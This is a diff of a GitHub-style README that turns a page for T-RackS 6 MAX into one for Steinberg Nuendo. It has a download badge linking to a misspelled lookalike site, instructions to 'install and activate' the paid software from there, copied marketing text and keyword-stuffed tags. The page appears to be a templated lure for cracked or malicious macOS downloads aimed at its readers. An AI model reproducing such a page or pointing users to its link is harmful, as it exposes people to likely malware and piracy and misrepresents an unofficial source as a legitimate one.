@@ -1,12 +1,12 @@
-# T-RackS 6 MAX – Complete Mixing & Mastering Suite
+# Nuendo – Professional Audio Production Suite
 <div align="center">
-  <img src="https://insmac.org/uploads/posts/2024-09/tracks-6.png" width="250"/>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Nuendo_Logo.svg/2560px-Nuendo_Logo.svg.png" width="350"/>
 </div>
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/tracks">
-    <img src="https://img.shields.io/badge/Get%20T--RackS%206%20MAX-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get T-RackS 6 MAX">
+  <a href="https://osx-aplications.github.io/.github/">
+    <img src="https://img.shields.io/badge/Get%20Nuendo-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Nuendo">
   </a>
 </p>
 
@@ -14,23 +14,21 @@
 
 # Installation Instructions
 1. Go To The Website Using The Button Above.  
-2. Follow The On-Screen Steps To Install And Activate T-RackS 6 MAX On Your Mac Device.
+2. Follow The On-Screen Steps To Install And Activate Nuendo On Your Mac Device.
 
 ---
 
 <div align="center">
-  <img src="https://media.sweetwater.com/m/products/image/99bde027beDUCuVlPmST2gN2o94Bj63NAho3t61s.png?v=99bde027be4c011b" width="1080"/>
+  <img src="https://media.sweetwater.com/m/products/image/0d00370a26hG2W5o9cHwZhlqvD3mGYNSLqMPB9Pc.png?v=0d00370a26654f17" width="1080"/>
 </div>
 <br>
 
 ## 🎧 Overview
-**IK Multimedia T-RackS 6 MAX** is a comprehensive mastering and mixing suite built for professional producers, engineers, and musicians who demand top-tier sound quality and workflow efficiency.  
-It provides an all-in-one environment for EQ, compression, limiting, and analog-style processing — all powered by IK Multimedia’s acclaimed audio modeling technology.  
+**Steinberg Nuendo** represents the next generation of professional audio post-production. Developed by *Steinberg*, it delivers a complete platform for recording, editing, sound design, and mixing — tailored for film, TV, games, and immersive audio projects.  
 
-T-RackS 6 MAX brings together over 30 studio-grade modules, ranging from classic hardware emulations to cutting-edge digital processors. With a modular interface, users can design custom signal chains and process audio with absolute precision.  
-Whether for final mastering, broadcast post-production, or detailed mix shaping, T-RackS delivers pristine clarity and analog warmth in every project.  
+Nuendo blends precision engineering with a fluid workflow. Its modular interface, advanced automation tools, and extensive format support give creators the ability to manage even the most complex productions efficiently. With integrated collaboration features, multi-channel editing, and real-time processing, it’s designed for sound professionals who demand power and reliability.  
 
-Its advanced visual metering tools, flexible routing, and intelligent presets make it an essential part of any professional studio setup.
+The software’s refined toolset makes it equally suited for dialogue editing, Foley, ADR, or surround sound mastering. Whether in a studio or on a production stage, **Nuendo** streamlines every stage of the audio pipeline while maintaining uncompromising sound quality.
 
 ---
 
@@ -38,12 +36,12 @@ Its advanced visual metering tools, flexible routing, and intelligent presets ma
 
 | Feature | Description |
 |-------------------------------------|------------------------------------------------------------------------------|
-| 🎛️ **All-in-One Processing Suite** | Includes EQs, compressors, limiters, reverbs, and saturation tools. |
-| 🎚️ **Analog-Modelled Sound** | Faithful recreations of legendary studio gear with rich analog tone. |
-| ⚙️ **Customizable Signal Chain** | Combine multiple modules for full mastering or track-specific processing. |
-| 🔊 **Advanced Metering Tools** | Visual analysis for loudness, phase, and spectrum monitoring. |
-| 🎧 **Standalone & Plugin Modes** | Run inside your DAW or as a standalone mastering application. |
-| 🧠 **Optimized Workflow** | Quick presets, drag-and-drop routing, and real-time A/B comparison. |
+| 🎚️ **High-Precision Audio Engine** | Delivers transparent sound with sample-accurate timing and dynamic depth. |
+| 🎬 **Post-Production Workflow** | Dedicated tools for film dubbing, Foley capture, and audio alignment. |
+| 🧠 **3D & Immersive Sound** | Built-in support for Dolby Atmos, Ambisonics, and multi-speaker setups. |
+| 🎛️ **Adaptive Interface** | Customize layouts and tools to match any project type or studio workflow. |
+| 🧩 **Cross-App Compatibility** | Shares projects seamlessly with Cubase and Steinberg hardware. |
+| ⚙️ **Deep Automation Control** | Create expressive soundscapes with curve-based and multi-lane automation. |
 
 ---
 
@@ -54,10 +52,10 @@ Its advanced visual metering tools, flexible routing, and intelligent presets ma
 | OS | macOS 11.0 or later |
 | Processor | Apple Silicon (M1/M2) or Intel |
 | Memory | 8 GB RAM (16 GB recommended) |
-| Storage | 3 GB free disk space |
+| Storage | 2 GB free disk space |
 | Display | 1440×900 resolution or higher |
 
 ---
 
 ## 🏷️ Tags
-ik multimedia • irig 2 • iloud micro monitor • irig stream • amplitube • amplitube 5 • iloud • i rig 2 • ik media • ik iloud micro monitor • ik multimedia iloud • tonex pedals • amplitube software • iloud micro monitor speakers • irigs • mic lav • iloud mtm • irig hd 2 • irig pro • iloud micro • amplitube 5 max • ik multimedia iloud mtm • irig pro duo • ik multimedia tonex • ik multimedia iloud micro monitor • irig blueturn • uno synth pro
+steinberg nuendo • steinberg nuendo mac • steinberg • steinberg mac • nuendo mac • nuendo • cubase • cubase 12 • cubase 12 pro • steinberg ur22c • cubase pro • steinberg cubase • steinberg ur44c • cubase artist 12 • steinberg ur22 • cubase pro 12 • pyramix • steinberg ur22 mk2 • cubase le • steinberg interface • cubase 5 • cubase 11 • steinberg ur12 • nuendo 12 • cubase artist • steinberg ur44 • ur44c • cubase 10 • steinberg wavelab
